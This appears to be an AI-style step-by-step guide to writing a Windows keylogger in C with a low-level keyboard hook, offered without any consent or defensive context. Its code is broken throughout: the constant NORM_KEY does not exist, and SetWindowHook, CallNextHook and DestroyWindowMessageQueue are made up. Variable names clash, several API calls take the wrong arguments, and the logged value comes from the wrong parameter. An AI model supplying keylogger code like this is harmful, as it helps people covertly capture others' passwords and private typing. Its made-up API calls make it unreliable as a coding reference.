To create a keystroke-logging application on Windows using C/C++, you can use the Windows API to set up a keyboard hook. Here's a step-by-step guide:

### Step 1: Include Necessary Headers
Include the required headers to access the Windows API functions and structures.

```c
#include <windows.h>
#include <windowsx.h>
#include <stdio.h>
```

### Step 2: Define the Keyboard Hook Function
Define a function to handle keyboard events.

```c
LRESULT CALLBACK keyboardHook(int nCode, int wParam, LPARAM lParam);
```

### Step 3: Implement the Keyboard Hook Function
Inside the hook function, check the event type and process the keystroke.

```c
LRESULT CALLBACK keyboardHook(int nCode, int wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        switch (wParam) {
            case NORM_KEY:
                // Insert your processing logic here
                // For example, log the key press
                printf("Key pressed: %d\n", (unsigned char)wParam);
                break;
            // Other event types can be handled here if needed
        }
    }
    return 0;
}
```

### Step 4: Set Up the Keyboard Hook
Set up the hook and attach it to the current thread.

```c
int main() {
    HHOOK hKeyboardHook = 0;
    hkKeyboardHook = SetWindowsHook(WH_KEYBOARD_LL, keyboardHook);
    if (hkKeyboardHook == 0) {
        printf("Failed to set keyboard hook\n");
        return 1;
    }

    // Attach the hook to the current thread
    HWND hwnd = GetForegroundWindow();
    SetWindowHook(hwnd, hkKeyboardHook);

    // Process messages
    MSG msg;
    while (GetMessage(&msg, hwnd, 0, 0)) {
        if (msg.message == WM_KEYDOWN || msg.message == WM_KEYUP) {
            // Call the hook function
            CallNextHook(hkKeyboardHook, &msg);
        }
        TranslateMessage(&msg);
        DispatchMessage(hwnd, msg);
    }

    // Cleanup
    UnhookWindowsHook(hwnd, hkKeyboardHook);
    DestroyWindowMessageQueue(hwnd);
    return 0;
}
```

